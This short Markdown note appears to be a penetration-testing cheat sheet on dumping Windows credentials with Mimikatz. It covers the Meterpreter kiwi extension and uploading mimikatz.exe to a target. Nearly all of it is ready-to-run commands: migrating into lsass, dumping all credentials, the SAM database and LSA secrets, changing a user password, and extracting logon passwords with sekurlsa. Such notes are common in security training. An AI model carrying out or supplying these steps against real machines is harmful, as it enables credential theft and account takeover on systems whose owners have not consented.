# Dumping Hashes with MimiKatz

This is a post-exploitation tool. It can be used for extraction of clear text passwords, hashes, and Kerberos Tickets from memory  
It extracts hashes from lsass.exe process  
MimiKatz can be used directly from Metasploit  -- kiwi
This requires elevated privileges to run correctly

1. get a Meterpreter session
2. Migrate to Lsass process
   1. ```pgrep lsass```
   2. ```migrate (process number)```
3.  ```load kiwi```

**creds_all** -- dumps all credentials  
**lsa_dump_sam** -- this will dump the SAM database  
**lsa_dump_secrets** -- this could provide with clear text credentials  
**password_change** -- this could change a user password

_**Document the SYSKEY as it can be useful later**_

### Uploading Mimikatz to the target

1. Navigate to the temp directory
2. ```upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe``` -- this uploads to the target
3. Open command shell session -- ```shell```
4. Execute mimikatz in the terminal -- ```.\mimikatz.exe```
5. Check Privileges -- ```privilege::debug```
6. Make sure it states **OK**
- Dump LSA -- ```lsadump::sam```
- Dump Secrets -- ```lsadump::secrets```
- Display logon passwords - ```sekurlsa::logonpasswords```
